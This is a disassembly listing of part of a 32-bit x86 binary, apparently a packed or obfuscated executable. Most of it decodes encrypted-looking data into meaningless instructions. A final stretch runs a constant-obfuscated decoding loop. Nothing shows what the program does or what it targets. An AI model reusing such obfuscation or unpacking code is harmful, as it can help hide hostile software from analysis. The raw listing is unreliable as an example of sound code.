  4058d8:	ins    BYTE PTR es:[edi],dx
  4058d9:	or     BYTE PTR [eax-0x5229a558],ah
  4058df:	jmp    0xf4bc:0xb9b714ec
  4058e6:	enter  0x95bc,0x18
  4058ea:	xchg   ebp,eax
  4058eb:	pslld  mm7,mm0
  4058ee:	lea    ecx,[esi]
  4058f0:	(bad)
  4058f3:	sub    BYTE PTR [edi-0x7cd7a9b6],dh
  4058f9:	ins    BYTE PTR es:[edi],dx
  4058fa:	jle    0x405969
  4058fc:	cmp    eax,0x3537f95c
  405901:	js     0x405931
  405903:	(bad)  
  405904:	ror    DWORD PTR [eax+0x1f4b2c55],1
  40590a:	inc    ecx
  40590b:	ja     0x405916
  40590d:	push   es
  40590e:	dec    ecx
  40590f:	push   es
  405910:	imul   ecx,DWORD PTR [ecx],0xffffff9e
  405913:	push   0x18
  405915:	sub    BYTE PTR ds:0xd38b3b9d,0x64
  40591c:	int    0xf
  40591e:	jge    0x40599b
  405920:	mov    esp,0x7845da2f
  405925:	data16 into 
  405927:	cmc    
  405928:	call   DWORD PTR [eax]
  40592a:	test   BYTE PTR [edx+ecx*2+0x7e],0xf3
  40592f:	pop    ecx
  405930:	(bad)  
  405931:	jge    0x405958
  405933:	jno    0x405963
  405935:	iret   
  405936:	push   esi
  405937:	aaa    
  405938:	call   0x9e7c3d09
  40593d:	or     al,0x59
  40593f:	sub    eax,0xa9959b0c
  405944:	addr16 mov ebx,0x454faa9c
  40594b:	adc    dh,BYTE PTR [eax]
  40594d:	leave  
  40594e:	in     eax,0xb5
  405950:	lods   al,BYTE PTR ds:[esi]
  405951:	test   eax,0xcfa1813e
  405956:	js     0x40591b
  405958:	xchg   esi,eax
  405959:	cmp    ebx,edi
  40595b:	stos   DWORD PTR es:[edi],eax
  40595c:	jmp    DWORD PTR [edx+0x17481887]
  405962:	(bad)  
  405963:	cli    
  405964:	xor    ah,bh
  405966:	jl     0x405917
  405968:	inc    esp
  405969:	test   DWORD PTR [ecx],0xb2fc020b
  40596f:	fwait
  405970:	daa    
  405971:	sub    esp,esp
  405973:	stc    
  405974:	loop   0x405967
  405976:	pushf  
  405977:	fstp   QWORD PTR ds:0xf44d8404
  40597d:	aaa    
  40597e:	dec    edx
  40597f:	and    al,BYTE PTR [eax+0x45]
  405982:	push   edi
  405983:	sbb    dh,BYTE PTR [ebp+0x8b3bcbd]
  405989:	es lock pop edi
  40598c:	nop
  40598d:	dec    ebx
  40598e:	mov    al,0xc8
  405990:	add    DWORD PTR [ebx],eax
  405992:	adc    DWORD PTR [ebp-0x262a13b7],ebp
  405998:	gs stos BYTE PTR es:[edi],al
  40599a:	ret    
  40599b:	test   DWORD PTR [ebx],0x26cd558f
  4059a1:	jno    0x405968
  4059a3:	packsswb mm6,mm1
  4059a6:	sbb    BYTE PTR fs:[ecx],ch
  4059a9:	js     0x4059be
  4059ab:	mov    dh,0x5e
  4059ad:	and    DWORD PTR [edx+0x48],ecx
  4059b0:	in     al,0xd
  4059b2:	in     al,dx
  4059b3:	cmp    al,0xf8
  4059b5:	in     eax,0xaf
  4059b7:	cmp    eax,0x56cbca30
  4059bc:	les    esi,FWORD PTR [ecx-0x43]
  4059bf:	cmp    al,0xcb
  4059c1:	cmc    
  4059c2:	out    0xae,al
  4059c4:	xchg   esp,eax
  4059c5:	xchg   ebp,eax
  4059c6:	int3   
  4059c7:	mov    ebx,0x7ae3fa07
  4059cc:	add    DWORD PTR [eax],ebx
  4059ce:	jb     0x405952
  4059d0:	mov    edi,0xa58a01d0
  4059d5:	cld    
  4059d6:	adc    eax,0xd8c09c67
  4059db:	and    DWORD PTR [ecx+0x31a6c499],eax
  4059e1:	xor    eax,0x26ea11de
  4059e6:	mov    edi,0x7bdf2fb2
  4059eb:	push   esp
  4059ec:	jmp    0x4059d8
  4059ee:	je     0x4059f9
  4059f0:	jecxz  0x405a62
  4059f2:	aam    0xfe
  4059f4:	push   cs
  4059f5:	je     0x405a40
  4059f7:	mov    ss,edx
  4059f9:	mov    bl,0xd1
  4059fb:	ins    BYTE PTR es:[edi],dx
  4059fc:	sbb    dl,dh
  4059fe:	jne    0x405a6e
  405a00:	mov    WORD PTR [edi+0x60af515c],ds
  405a06:	clc    
  405a07:	dec    esp
  405a08:	jp     0x405999
  405a0a:	sub    al,BYTE PTR [ecx-0x93535ff]
  405a10:	sub    DWORD PTR [eax],ebp
  405a12:	inc    eax
  405a13:	xchg   esi,edi
  405a15:	mov    eax,ds:0x533cd1fd
  405a1a:	pop    edx
  405a1b:	cdq    
  405a1c:	cli    
  405a1d:	fdivp  st(1),st
  405a1f:	(bad)  
  405a20:	loopne 0x405a03
  405a22:	out    0x37,al
  405a24:	stc    
  405a25:	jmp    0xb747318
  405a2a:	or     eax,edi
  405a2c:	dec    ebx
  405a2d:	xor    ebx,DWORD PTR [edx+0x624d53e5]
  405a33:	push   0x3f
  405a35:	xchg   edi,eax
  405a36:	into   
  405a37:	cmp    bh,ch
  405a39:	mov    cl,0xba
  405a3b:	push   ds
  405a3c:	cmp    esp,ebx
  405a3e:	sbb    al,0xfb
  405a40:	(bad)  
  405a41:	sub    al,0xbe
  405a43:	cmc    
  405a44:	aas    
  405a45:	or     al,BYTE PTR [ecx-0x7fc8cde5]
  405a4b:	xchg   ebx,esi
  405a4d:	mov    ecx,0xbdd5a37d
  405a52:	adc    DWORD PTR [eax+edx*2+0x30017767],ecx
  405a59:	out    0x4b,eax
  405a5b:	daa    
  405a5c:	mov    ah,0x5e
  405a5e:	retf   
  405a5f:	push   ds
  405a60:	dec    ebp
  405a61:	stc    
  405a62:	sbb    BYTE PTR [ecx],ch
  405a64:	xchg   cl,al
  405a66:	xor    dh,bl
  405a68:	add    dh,BYTE PTR [eax]
  405a6a:	push   eax
  405a6b:	jg     0x405aac
  405a6d:	sbb    dl,BYTE PTR [edi-0x58aa8c4c]
  405a73:	xchg   ecx,eax
  405a74:	sub    al,0xf9
  405a76:	pop    ecx
  405a77:	fsub   QWORD PTR [esi+0x4b9e859]
  405a7d:	mov    ah,0x6f
  405a7f:	push   eax
  405a80:	leave  
  405a81:	icebp  
  405a82:	mov    esi,0x62ac36f4
  405a87:	mov    ch,0x76
  405a89:	(bad)  
  405a8a:	in     eax,0xce
  405a8c:	sbb    edi,DWORD PTR [edx+edi*8+0x646cb342]
  405a93:	lahf   
  405a94:	dec    esi
  405a95:	ds mul esi
  405a98:	jmp    0xdbe53698
  405a9d:	xchg   DWORD PTR [ecx],esp
  405a9f:	mov    eax,ds:0x496a859e
  405aa4:	mov    dl,0x61
  405aa6:	sbb    ebp,eax
  405aa8:	call   0x996268c4
  405aad:	fld    DWORD PTR [eax-0x734da84e]
  405ab3:	ins    DWORD PTR es:[edi],dx
  405ab4:	xor    BYTE PTR [eax+edi*4+0x76ba0fc2],ah
  405abb:	mov    edi,esi
  405abd:	fcmovne st,st(3)
  405abf:	loop   0x405ac2
  405ac1:	push   edi
  405ac2:	xchg   edx,eax
  405ac3:	or     DWORD PTR [edi+ebx*4],edx
  405ac6:	cld    
  405ac7:	sbb    DWORD PTR [eax+0x39],0x6e5ae4a0
  405ace:	lods   al,BYTE PTR ds:[esi]
  405acf:	rcr    DWORD PTR [edx-0x5caaf8bc],cl
  405ad5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ad6:	xor    ah,BYTE PTR [ecx+0x6b]
  405ad9:	inc    edi
  405ada:	bound  edi,QWORD PTR [edx]
  405adc:	inc    edi
  405add:	sbb    DWORD PTR [eax+0x6b],edi
  405ae0:	xor    al,0xbe
  405ae2:	gs jmp 0x405b00
  405ae5:	fcmovnb st,st(5)
  405ae7:	ss or  eax,0x7161cc58
  405aed:	outs   dx,BYTE PTR ds:[esi]
  405aee:	xchg   esi,eax
  405aef:	(bad)  
  405af0:	mov    ebx,0x80f5bfd4
  405af5:	std    
  405af6:	and    DWORD PTR [edi+edx*8],ebx
  405af9:	fild   QWORD PTR [ecx-0x71]
  405afc:	lods   al,BYTE PTR ds:[esi]
  405afd:	cli    
  405afe:	inc    esi
  405aff:	sub    eax,0x5d7d7c0a
  405b04:	mov    eax,ds:0xc195baa7
  405b09:	repnz push edi
  405b0b:	push   0x6a40d0d5
  405b10:	push   ds
  405b11:	cmp    al,0xe8
  405b13:	adc    DWORD PTR [ebx-0x4e],ebx
  405b16:	mov    ebx,DWORD PTR [edi+0x5e]
  405b19:	adc    DWORD PTR [esp+eax*1],ecx
  405b1c:	rcr    DWORD PTR [ebx],cl
  405b1e:	enter  0xd48c,0xa7
  405b22:	push   ss
  405b23:	cli    
  405b24:	je     0x405afa
  405b26:	cli    
  405b27:	cs pop ss
  405b29:	int    0x10
  405b2b:	xchg   DWORD PTR [edi],ebx
  405b2d:	cmp    BYTE PTR [ebx],al
  405b2f:	cli    
  405b30:	dec    edi
  405b31:	jmp    0xddb18a4f
  405b36:	cld    
  405b37:	add    edi,DWORD PTR ds:0xd856097b
  405b3d:	dec    ebp
  405b3e:	sub    al,0xee
  405b40:	fimul  WORD PTR [ebx*2-0x6a173353]
  405b48:	lds    ecx,FWORD PTR [ecx+eiz*4]
  405b4b:	add    esi,ebp
  405b4d:	push   ecx
  405b4e:	outs   dx,BYTE PTR ds:[esi]
  405b4f:	cmp    DWORD PTR [ecx+0x614593c9],edx
  405b55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b56:	test   eax,0xd13c4f02
  405b5b:	daa    
  405b5c:	(bad)  
  405b5d:	stc    
  405b5e:	push   eax
  405b5f:	pop    es
  405b60:	je     0x405b72
  405b62:	mov    esp,0xfd9933fe
  405b67:	mov    BYTE PTR [ebx+ecx*2],al
  405b6a:	push   cs
  405b6b:	cld    
  405b6c:	mov    al,ds:0x2a7048c
  405b71:	in     eax,0x7d
  405b73:	sub    DWORD PTR [edi-0x53],0x89e3f545
  405b7a:	scas   al,BYTE PTR es:[edi]
  405b7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b7c:	push   0x2cb2ae40
  405b81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b82:	pop    ecx
  405b83:	xor    al,0xe
  405b85:	adc    al,0xb2
  405b87:	inc    ebx
  405b88:	(bad)  
  405b89:	outs   dx,DWORD PTR ds:[esi]
  405b8a:	push   ebp
  405b8b:	aad    0x4f
  405b8d:	pushf  
  405b8e:	jmp    FWORD PTR [esi]
  405b90:	pop    eax
  405b91:	clc    
  405b92:	loopne 0x405b61
  405b94:	sbb    eax,DWORD PTR [esi+0x1eb06a6]
  405b9a:	inc    edx
  405b9b:	gs push ebp
  405b9d:	pop    ebx
  405b9e:	scas   eax,DWORD PTR es:[edi]
  405b9f:	ins    DWORD PTR es:[edi],dx
  405ba0:	xor    DWORD PTR [edi-0x1c],ecx
  405ba3:	repnz fs pop esi
  405ba6:	rcl    ebx,cl
  405ba8:	(bad)  
  405ba9:	popa   
  405baa:	cmp    al,0x43
  405bac:	xchg   esp,eax
  405bad:	xchg   BYTE PTR [eax-0x9],bl
  405bb0:	pushf  
  405bb1:	icebp  
  405bb2:	add    al,0xdb
  405bb4:	mov    eax,ds:0xf7206c58
  405bb9:	inc    eax
  405bba:	cdq    
  405bbb:	out    dx,eax
  405bbc:	push   ebp
  405bbd:	xchg   edx,eax
  405bbe:	and    ch,ch
  405bc0:	sub    al,0x9b
  405bc2:	mov    ds:0x31eb00af,eax
  405bc7:	mov    ss,WORD PTR [ecx-0xd83285e]
  405bcd:	mov    ds,WORD PTR [ecx]
  405bcf:	push   ebp
  405bd0:	jns    0x405bb8
  405bd2:	bound  edx,QWORD PTR [edx+eax*1-0x5f99cf4b]
  405bd9:	add    eax,0xd5baa68c
  405bde:	pusha  
  405bdf:	xor    al,0xfe
  405be1:	xchg   edi,eax
  405be2:	adc    ecx,ebx
  405be4:	ret    
  405be5:	sar    DWORD PTR [edx+0x20],1
  405be8:	sahf   
  405be9:	dec    esi
  405bea:	outs   dx,DWORD PTR ds:[esi]
  405beb:	popf   
  405bec:	pop    ebx
  405bed:	push   ds
  405bee:	push   eax
  405bef:	pop    ds
  405bf0:	pop    ss
  405bf1:	sub    BYTE PTR [esi],dl
  405bf3:	sub    esi,DWORD PTR [esi+0x37d09646]
  405bf9:	sbb    DWORD PTR [edx-0x5f],eax
  405bfc:	or     ecx,ebp
  405bfe:	jne    0x405c5f
  405c00:	(bad)  
  405c01:	dec    ebp
  405c02:	adc    ebp,DWORD PTR [ecx+0x3b]
  405c05:	jo     0x405bad
  405c07:	inc    esi
  405c08:	xor    ah,BYTE PTR [ebp-0x4f]
  405c0b:	push   ebx
  405c0c:	lods   al,BYTE PTR ds:[esi]
  405c0d:	call   0x16c0d448
  405c12:	mov    al,BYTE PTR [esi]
  405c14:	lods   eax,DWORD PTR ds:[esi]
  405c15:	inc    esp
  405c16:	(bad)  
  405c17:	iret   
  405c18:	(bad)  
  405c19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c1a:	repnz shl DWORD PTR [ecx],1
  405c1d:	and    dl,dh
  405c1f:	iret   
  405c20:	and    DWORD PTR [edx+0xd],edx
  405c23:	add    eax,0xe3866012
  405c28:	add    eax,0x46da5185
  405c2d:	aad    0xa5
  405c2f:	cmp    esp,ebp
  405c31:	fild   WORD PTR [esi]
  405c33:	xchg   DWORD PTR [esi],edi
  405c35:	arpl   WORD PTR [ebx+edx*4+0x65],bp
  405c39:	ds adc eax,0x996d4ced
  405c3f:	push   ebp
  405c40:	mov    ah,0xdf
  405c42:	pop    esi
  405c43:	add    ecx,0xffffff91
  405c46:	lea    edi,[si]
  405c49:	ror    esp,0x8e
  405c4c:	shr    BYTE PTR [edx+0x3b],1
  405c4f:	jge    0x405ca2
  405c51:	add    bh,BYTE PTR [edx]
  405c53:	(bad)  
  405c54:	dec    ebp
  405c55:	mov    WORD PTR [ecx+ebx*8],cs
  405c58:	test   DWORD PTR [ecx-0xdc6e977],ebx
  405c5e:	enter  0x33fb,0x4f
  405c62:	xchg   ecx,eax
  405c63:	push   edx
  405c64:	adc    ebx,ebx
  405c66:	in     al,dx
  405c67:	imul   eax,DWORD PTR [ecx+0x5c5ca3ac],0x3939d4a5
  405c71:	push   cs
  405c72:	cmp    al,dh
  405c74:	sbb    bh,bh
  405c76:	ins    DWORD PTR es:[edi],dx
  405c77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c78:	test   al,0x1b
  405c7a:	int3   
  405c7b:	fs pop ds
  405c7d:	jmp    0x5215fff9
  405c82:	daa    
  405c83:	retf   0x7cfc
  405c86:	(bad)  
  405c87:	jns    0x405cc4
  405c89:	cli    
  405c8a:	out    0x97,al
  405c8c:	push   edi
  405c8d:	cli    
  405c8e:	mov    ah,0x6f
  405c90:	push   cs
  405c91:	dec    eax
  405c92:	xchg   bh,cl
  405c94:	imul   esi,edx,0xffffffdc
  405c97:	jge    0x405cfe
  405c99:	scas   al,BYTE PTR es:[edi]
  405c9a:	ss xchg ecx,eax
  405c9c:	ja     0x405cae
  405c9e:	mov    edi,0x6b585b2d
  405ca3:	cmp    eax,0x70be058c
  405ca8:	sahf   
  405ca9:	and    al,cl
  405cab:	adc    eax,0xf990e08f
  405cb0:	mov    edi,0x561d22bb
  405cb5:	ss or  dh,bl
  405cb8:	loopne 0x405ca9
  405cba:	fild   WORD PTR [edi+0x2ab43c87]
  405cc1:	or     cl,BYTE PTR [ebp-0x257c8635]
  405cc7:	xchg   edi,eax
  405cc8:	mov    al,es:0xb7b3855f
  405cce:	repnz sub cl,BYTE PTR [edi]
  405cd1:	int    0x4a
  405cd3:	stc    
  405cd4:	std    
  405cd5:	lahf   
  405cd6:	jp     0x405c8a
  405cd8:	sbb    ch,al
  405cda:	dec    ebp
  405cdb:	out    0xf2,eax
  405cdd:	push   eax
  405cde:	(bad)  
  405cdf:	push   0xe2b58085
  405ce4:	add    eax,0x2f5784b3
  405ce9:	(bad)  
  405cea:	lods   eax,DWORD PTR ds:[esi]
  405ceb:	jl     0x405d58
  405ced:	mov    dh,0xe7
  405cef:	xchg   DWORD PTR [ecx+0x10],eax
  405cf2:	jge    0x405cfe
  405cf4:	cmp    DWORD PTR [edi+eiz*2-0x148c4d97],eax
  405cfb:	(bad)  
  405cfc:	sti    
  405cfd:	and    BYTE PTR [eax],ah
  405cff:	sub    al,bl
  405d01:	jmp    0x689:0xf2f29c7f
  405d08:	fisttp QWORD PTR [edx+0x1a]
  405d0b:	jmp    0xfd0b666f
  405d10:	rcl    BYTE PTR [ecx-0x21],cl
  405d13:	dec    esp
  405d14:	out    0xf1,eax
  405d16:	ja     0x405cdb
  405d18:	xor    eax,ebx
  405d1a:	out    0xc,eax
  405d1c:	xchg   dl,ch
  405d1e:	jle    0x405cd1
  405d20:	jmp    0x405cfd
  405d22:	xchg   ebx,eax
  405d23:	scas   al,BYTE PTR es:[edi]
  405d24:	mov    esp,0xd4152cdc
  405d29:	dec    edi
  405d2a:	jp     0x405d8b
  405d2c:	inc    esi
  405d2d:	or     ecx,DWORD PTR [ecx-0x8]
  405d30:	mov    ebx,eax
  405d32:	(bad)  
  405d34:	adc    eax,0x2fe4d0c5
  405d39:	shl    DWORD PTR [edx],1
  405d3b:	hlt    
  405d3c:	sbb    bh,BYTE PTR [eax+edx*1]
  405d3f:	xchg   ebp,eax
  405d40:	adc    esp,esp
  405d42:	mov    bh,0xf6
  405d44:	mov    esp,0x313c29e2
  405d49:	adc    eax,0x5447fd7
  405d4e:	jge    0x405d39
  405d50:	inc    esi
  405d51:	cs test ch,al
  405d54:	es ret 0xed99
  405d58:	or     ch,ah
  405d5a:	sub    dh,BYTE PTR [ebx+0x4ba497e3]
  405d60:	(bad)  
  405d61:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  405d63:	jo     0x405ddb
  405d65:	mov    ebp,?
  405d67:	out    0xcd,al
  405d69:	xor    bh,al
  405d6b:	aas    
  405d6c:	std    
  405d6d:	dec    eax
  405d6e:	pop    esi
  405d6f:	or     DWORD PTR fs:[edx],esi
  405d72:	pop    ebp
  405d73:	cmp    DWORD PTR [ecx+0x6f734d6b],0xfffffff2
  405d7a:	ror    esi,cl
  405d7c:	xchg   BYTE PTR [edx+0x6d],cl
  405d7f:	xor    ch,al
  405d81:	add    BYTE PTR [edi],al
  405d83:	out    dx,al
  405d84:	adc    al,BYTE PTR [ebx-0x46587811]
  405d8a:	adc    dl,BYTE PTR [ebp-0x2]
  405d8d:	addr16 in al,0x64
  405d90:	mov    dh,BYTE PTR [edx+0x6d61b97d]
  405d96:	pop    esi
  405d97:	sbb    eax,0xea71d36e
  405d9c:	leave  
  405d9d:	fild   QWORD PTR [esi+0x18814674]
  405da3:	out    dx,al
  405da4:	sub    ah,BYTE PTR [ecx+0x32]
  405da7:	push   ebx
  405da8:	ins    DWORD PTR es:[edi],dx
  405da9:	fnstcw WORD PTR [esi+edi*2]
  405dac:	iret   
  405dad:	daa    
  405dae:	mov    dl,0xdd
  405db0:	pusha  
  405db1:	loope  0x405dcc
  405db3:	mov    ?,esi
  405db5:	mov    ds:0x211e1d57,eax
  405dba:	(bad)  
  405dbb:	mov    ds:0x752879b2,eax
  405dc0:	inc    esi
  405dc1:	jecxz  0x405d63
  405dc3:	jo     0x405dd5
  405dc5:	arpl   WORD PTR [ecx+0x7c],di
  405dc8:	repnz sbb esp,0xffffff83
  405dcc:	sub    ah,BYTE PTR [ebx]
  405dce:	mov    ebx,0x4a7f61ea
  405dd3:	sti    
  405dd4:	jns    0x405d84
  405dd6:	push   ebx
  405dd7:	enter  0xd44c,0x2b
  405ddb:	out    0x1,eax
  405ddd:	retf   
  405dde:	das    
  405ddf:	add    eax,0x4277d3eb
  405de4:	ret    0xa40c
  405de7:	fcom   st(0)
  405de9:	mov    BYTE PTR [edi-0x10],bh
  405dec:	adc    eax,0x675dfe7e
  405df1:	pop    esi
  405df2:	push   ss
  405df3:	add    ebp,DWORD PTR [ebx]
  405df5:	shl    DWORD PTR [esi],cl
  405df7:	es xchg esp,eax
  405df9:	outs   dx,BYTE PTR ds:[esi]
  405dfa:	and    BYTE PTR [esi-0x24],dl
  405dfd:	mov    fs:0x4c9f8ada,al
  405e03:	es cld 
  405e05:	jbe    0x405e49
  405e07:	lods   al,BYTE PTR ds:[esi]
  405e08:	lods   eax,DWORD PTR ds:[esi]
  405e09:	mov    dh,0xc1
  405e0b:	inc    eax
  405e0c:	pop    edi
  405e0d:	fisttp DWORD PTR [esi-0x3e9e8b6b]
  405e13:	ret    0x1a47
  405e16:	pop    ebx
  405e17:	data16 fs (bad) 
  405e1a:	gs mov esi,0x78c0bbcf
  405e20:	fidivr DWORD PTR [ecx]
  405e22:	call   0x47da2db0
  405e27:	retf   0xe00f
  405e2a:	cmp    BYTE PTR [ebx-0x1cb416e2],0x23
  405e31:	jecxz  0x405e92
  405e33:	shr    DWORD PTR [ebx],0xc1
  405e36:	mov    dh,0x1a
  405e38:	inc    ebp
  405e39:	xchg   esp,eax
  405e3a:	mov    BYTE PTR [ecx],bl
  405e3c:	clc    
  405e3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e3e:	mov    ds:0xee0ce4c2,eax
  405e43:	clc    
  405e44:	(bad)  
  405e46:	ficomp WORD PTR [edx+0x2c23d52c]
  405e4c:	pushf  
  405e4d:	inc    esi
  405e4e:	mov    esi,0x42eb7be6
  405e53:	mov    al,ds:0x9406ef41
  405e58:	aas    
  405e59:	gs push edx
  405e5b:	call   0x370a9371
  405e60:	nop
  405e61:	sti    
  405e62:	daa    
  405e63:	adc    eax,0xe0e7ac0a
  405e68:	jg     0x405e19
  405e6a:	inc    ecx
  405e6b:	push   eax
  405e6c:	sub    BYTE PTR [ebx+ebp*1-0x26569f56],ah
  405e73:	cmp    DWORD PTR [esi],edx
  405e75:	leave  
  405e76:	xchg   edx,eax
  405e77:	xor    BYTE PTR [ecx-0x1c18c210],ah
  405e7d:	cmp    esp,ecx
  405e7f:	add    dl,BYTE PTR [ebx+edx*8]
  405e82:	test   eax,0x44afdbe6
  405e87:	add    dh,BYTE PTR [ebx-0x2557de27]
  405e8d:	int3   
  405e8e:	add    al,0xcc
  405e90:	jge    0x405e8e
  405e92:	lock (bad) 
  405e94:	(bad)  
  405e95:	stos   DWORD PTR es:[edi],eax
  405e96:	dec    esp
  405e97:	sub    eax,0xfa7a88e2
  405e9c:	dec    edi
  405e9d:	mov    ecx,0xcf877114
  405ea2:	push   ebp
  405ea3:	pop    ds
  405ea4:	addr16 or dh,cl
  405ea7:	retf   0xfc19
  405eaa:	push   0xffffff93
  405eac:	popa   
  405ead:	pop    fs
  405eaf:	xor    eax,0xafd37c89
  405eb4:	(bad)  
  405eb5:	mov    ds:0x71644db6,al
  405eba:	jns    0x405ee6
  405ebc:	dec    eax
  405ebd:	mov    ds:0x3398c19b,eax
  405ec2:	mov    edi,0x627b4d8a
  405ec7:	or     al,0x9
  405ec9:	mov    DWORD PTR [eax],esp
  405ecb:	pop    eax
  405ecc:	inc    edi
  405ecd:	call   0x1efb:0x600c1df0
  405ed4:	fiadd  WORD PTR [ebp*4+0x2326c22d]
  405edb:	push   ds
  405edc:	loope  0x405ea8
  405ede:	and    BYTE PTR [ecx-0x8],0x89
  405ee2:	das    
  405ee3:	(bad)  
  405ee4:	sub    dl,ah
  405ee6:	div    cl
  405ee8:	xchg   edx,eax
  405ee9:	and    al,0x1d
  405eeb:	(bad)  
  405eec:	(bad)  
  405eed:	loope  0x405e94
  405eef:	ret    0x35c
  405ef2:	mov    ebp,0x152d009a
  405ef7:	push   eax
  405ef8:	shl    BYTE PTR [ecx-0x5f],cl
  405efb:	sub    DWORD PTR [ecx-0x6863d030],edi
  405f01:	outs   dx,DWORD PTR ds:[esi]
  405f02:	push   edx
  405f03:	mov    ebx,0x34d8206e
  405f08:	outs   dx,DWORD PTR ds:[esi]
  405f09:	inc    edi
  405f0a:	cs add al,0x8a
  405f0d:	sub    ecx,DWORD PTR [ecx]
  405f0f:	xchg   BYTE PTR [esi-0x41],ah
  405f12:	mov    ah,0x0
  405f14:	inc    edi
  405f15:	call   0x9a2faba1
  405f1a:	mov    ch,0xb
  405f1c:	and    eax,0xe15db24f
  405f21:	into   
  405f22:	ror    edx,1
  405f24:	xor    DWORD PTR [esi+0x42],edx
  405f27:	or     DWORD PTR [eax-0x3cd4e84f],eax
  405f2d:	ret    0xf64c
  405f30:	xor    ah,bl
  405f32:	dec    ebp
  405f33:	xchg   edi,eax
  405f34:	pop    esp
  405f35:	test   eax,0x58abd2f4
  405f3a:	inc    BYTE PTR [esi-0x222d25ac]
  405f40:	pop    eax
  405f41:	dec    esi
  405f42:	xchg   ecx,eax
  405f43:	pop    DWORD PTR [edx]
  405f45:	stos   DWORD PTR es:[edi],eax
  405f46:	push   ds
  405f47:	mov    DWORD PTR [ebp-0x2c],eax
  405f4a:	mov    eax,DWORD PTR [ebp-0x58]
  405f4d:	sub    eax,ecx
  405f4f:	mov    DWORD PTR [ebp-0x1c],eax
  405f52:	mov    eax,DWORD PTR [ebp-0x1c]
  405f55:	mov    DWORD PTR [ebp-0x14],eax
  405f58:	mov    eax,DWORD PTR [ebp-0x2c]
  405f5b:	mov    DWORD PTR [ebp-0x38],0xf89c85b5
  405f62:	mov    DWORD PTR [ebp-0x54],eax
  405f65:	mov    DWORD PTR [ebp-0x20],0xf89c85b4
  405f6c:	mov    eax,DWORD PTR [ebp-0x38]
  405f6f:	xor    eax,esi
  405f71:	add    eax,edi
  405f73:	mov    DWORD PTR [ebp-0x10],eax
  405f76:	mov    eax,DWORD PTR [ebp-0x38]
  405f79:	xor    eax,esi
  405f7b:	add    eax,edi
  405f7d:	mov    DWORD PTR [ebp-0x8],eax
  405f80:	mov    DWORD PTR [ebp-0x2c],0xf89c8595
  405f87:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  405f8e:	mov    eax,DWORD PTR [ebp-0x38]
  405f91:	mov    edx,DWORD PTR [ebp-0x14]
  405f94:	xor    eax,esi
  405f96:	add    eax,edi
  405f98:	cmp    edx,eax
  405f9a:	je     0x40852b
  405fa0:	mov    eax,DWORD PTR [ebp-0x20]
  405fa3:	xor    eax,esi
  405fa5:	mov    edx,0xffcd8d06
  405faa:	sub    edx,eax
  405fac:	add    edx,DWORD PTR [ebp-0x14]
  405faf:	mov    eax,DWORD PTR [ebp-0x20]
  405fb2:	mov    ebx,DWORD PTR [ebp-0x10]
  405fb5:	xor    eax,esi
  405fb7:	add    eax,edi
  405fb9:	imul   eax,ebx
  405fbc:	cmp    eax,edx
  405fbe:	ja     0x408528
  405fc4:	mov    edx,DWORD PTR [ebp-0x10]
  405fc7:	mov    eax,DWORD PTR [ebp-0x14]
  405fca:	mov    ebx,DWORD PTR [ebp-0x2c]
  405fcd:	sub    eax,edx
  405fcf:	xor    ebx,esi
  405fd1:	xor    edx,edx
  405fd3:	add    ebx,edi
  405fd5:	div    ebx
  405fd7:	mov    DWORD PTR [ebp-0x8],eax
  405fda:	mov    eax,DWORD PTR [ebp-0x44]
  405fdd:	mov    edx,DWORD PTR [ebp-0x8]
  405fe0:	xor    eax,esi
  405fe2:	add    eax,edi
  405fe4:	cmp    edx,eax
  405fe6:	jbe    0x405ff6
  405fec:	mov    eax,DWORD PTR [ebp-0x44]
  405fef:	xor    eax,esi
  405ff1:	add    eax,edi
  405ff3:	mov    DWORD PTR [ebp-0x8],eax
  405ff6:	mov    eax,DWORD PTR [ebp-0x2c]
  405ff9:	mov    edx,DWORD PTR [ebp-0x8]
  405ffc:	xor    eax,esi
  405ffe:	add    eax,edi
  406000:	imul   eax,edx
  406003:	mov    DWORD PTR [ebp-0x8],eax
  406006:	mov    eax,DWORD PTR [ebp-0x38]
  406009:	mov    edx,DWORD PTR [ebp-0x8]
  40600c:	xor    eax,esi
  40600e:	add    eax,edi
  406010:	cmp    edx,eax
  406012:	je     0x408511
  406018:	mov    eax,DWORD PTR [ebp-0x8]
  40601b:	mov    DWORD PTR [ebp-0x18],eax
  40601e:	mov    eax,DWORD PTR [ebp-0x10]
  406021:	add    eax,DWORD PTR [ebp-0x54]
  406024:	mov    DWORD PTR [ebp-0x1c],0xf89c85b5
  40602b:	mov    DWORD PTR [ebp-0x8],eax
  40602e:	mov    eax,0xf89c85b4
  406033:	mov    DWORD PTR [ebp-0x28],eax
  406036:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  40603d:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  406044:	mov    DWORD PTR [ebp-0x30],eax
  406047:	mov    eax,DWORD PTR [ebp-0x1c]
  40604a:	xor    eax,esi
  40604c:	add    eax,edi
  40604e:	jmp    0x4084cd
  406053:	mov    DWORD PTR [ebp-0x4c],0xf89c85a2
  40605a:	mov    DWORD PTR [ebp-0x50],0xf89c85af
  406061:	mov    eax,DWORD PTR [ebp-0x30]
  406064:	mov    edx,DWORD PTR [ebp-0xc]
  406067:	xor    eax,esi
  406069:	add    eax,edi
  40606b:	imul   eax,edx
  40606e:	mov    edx,DWORD PTR [ebp-0x8]
  406071:	mov    al,BYTE PTR [eax+edx*1]
  406074:	mov    BYTE PTR [ebp-0x1],al
  406077:	mov    eax,DWORD PTR [ebp-0x30]
  40607a:	mov    edx,DWORD PTR [ebp-0xc]
  40607d:	xor    eax,esi
  40607f:	add    eax,edi
  406081:	imul   eax,edx
  406084:	mov    edx,DWORD PTR [ebp-0x5c]
  406087:	xor    edx,esi
  406089:	add    eax,edx
  40608b:	mov    edx,DWORD PTR [ebp-0x8]
  40608e:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  406096:	mov    edx,DWORD PTR [ebp-0x4c]
  406099:	xor    edx,esi
  40609b:	lea    eax,[edx+eax*1+0x3272fa]
